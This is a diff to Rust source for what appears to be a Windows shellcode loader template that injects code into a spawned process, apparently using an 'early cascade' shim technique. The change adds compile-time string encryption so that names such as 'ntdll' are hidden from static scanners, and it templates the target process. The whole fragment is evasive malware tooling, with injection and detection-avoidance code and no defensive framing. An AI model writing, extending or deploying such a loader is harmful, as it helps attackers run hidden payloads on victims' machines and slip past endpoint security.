@@ -1,6 +1,9 @@
 #![windows_subsystem = "windows"]
 #![allow(non_snake_case, non_camel_case_types)]
 
+{{LITCRYPT_SETUP}}
+
+use std::ffi::CString;
 use std::include_bytes;
 use std::mem;
 use std::ptr::null_mut;
@@ -230,7 +233,8 @@ unsafe fn find_shims_flag(base: usize, offset_addr: usize) -> Option<usize> {
 }
 
 unsafe fn do_inject(pi: &PROCESS_INFORMATION, sc: &[u8]) -> bool {
-    let h_ntdll = GetModuleHandleA(b"ntdll\0".as_ptr() as *const i8);
+    let ntdll = CString::new(lc!("ntdll")).unwrap();
+    let h_ntdll = GetModuleHandleA(ntdll.as_ptr());
     if h_ntdll.is_null() {
         return false;
     }
@@ -332,7 +336,9 @@ unsafe fn do_inject(pi: &PROCESS_INFORMATION, sc: &[u8]) -> bool {
 
 fn cascade(sc: &[u8]) {
     unsafe {
-        let mut cmd = b"{{TARGET_PROCESS}}\0".to_vec();
+        let mut cmd = CString::new({{TARGET_PROCESS}})
+            .unwrap()
+            .into_bytes_with_nul();
         let mut si: STARTUPINFOA = mem::zeroed();
         si.cb = mem::size_of::<STARTUPINFOA>() as u32;
         let mut pi: PROCESS_INFORMATION = mem::zeroed();
